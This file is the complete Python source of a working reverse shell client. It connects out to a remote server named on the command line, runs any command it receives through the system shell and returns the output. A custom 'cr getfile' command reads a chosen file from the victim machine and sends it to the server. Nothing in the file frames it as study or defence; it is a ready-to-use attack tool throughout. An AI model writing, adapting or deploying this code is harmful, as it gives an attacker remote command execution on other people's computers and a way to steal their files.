import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

def HandleCrCommand(splited_command):
    _output = ""
    if splited_command[1].lower() == "getfile":
        try:
            cr_SendFile(splited_command[2])
        except FileNotFoundError as e:
            cwd = os.getcwd()
            message = f"{str(e)}{SEPARATOR}{cwd}"
            s.send(message.encode())


def cr_SendFile(filename: str):
    filesize = os.path.getsize(filename)
    s.send(f"{filename}{SEPARATOR}{filesize}".encode())
    with open(filename, "rb") as f:
        while True:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break
            s.sendall(bytes_read)


s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()

    if splited_command[0].lower() == "cr":
        # cr1tter command
        HandleCrCommand(splited_command)
    else:
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        elif splited_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)

        cwd = os.getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())

s.close()